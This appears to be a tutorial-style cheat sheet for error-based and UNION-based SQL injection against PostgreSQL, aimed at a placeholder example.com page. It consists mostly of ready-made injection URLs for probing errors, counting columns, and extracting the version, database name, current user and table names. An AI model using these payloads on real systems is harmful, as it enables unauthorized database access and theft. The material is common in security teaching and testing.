# SQLI (PostgreSQL) | Error Based

Context URL: \
`http://example.com/example/page.php?id=3`

To test if exists SQLI Error Based, try the:

```
http://example.com/example/page.php?id='
```

If **warnings** return to you, exploit them!

Note: Common error -> **Warning: pg\_exec()**

## Testing

First, test how far the order by arrives before giving an error. Ex:&#x20;

```
http://example.com/example/page.php?id=1 order by X
```

Note: Replace the **X** with **1, 2, 3, 4...** until it stops showing pages and displays a **warning.**

### Second method

Test how far the union select arrives before giving an error. Ex:

```
http://example.com/example/page.php?id=1 union select 1,2,3,4....
```

Note: If you get an error saying it doesn't accept integer union types, test with null values. Ex:

```
http://example.com/example/page.php?id=1 union select null,null,null,null....
```

## Exploit

**Context**: 4 numbers before the error\
**Context** URL: `http://example.com/example/page.php?id=1 union select null,null,null,null`

#### To show the Postgresql version on the screen:

```
http://example.com/example/page.php?id=1 union select null,version(),null,null
```

#### To show current database name :

```
http://example.com/example/page.php?id=1 union select null,current_database(),null,null
```

#### To show current user:

```
http://example.com/example/page.php?id=1 union select null,current_user(),null,null
```

#### To show tables

```
http://example.com/example/page.php?id=1 union select null,table_name,null,null from information_schema.tables
```

Note: To see how information-schema is handled in postgree and to exploit it in more ways, have a look at the official site:

https://www.postgresql.org/docs/current/information-schema.html

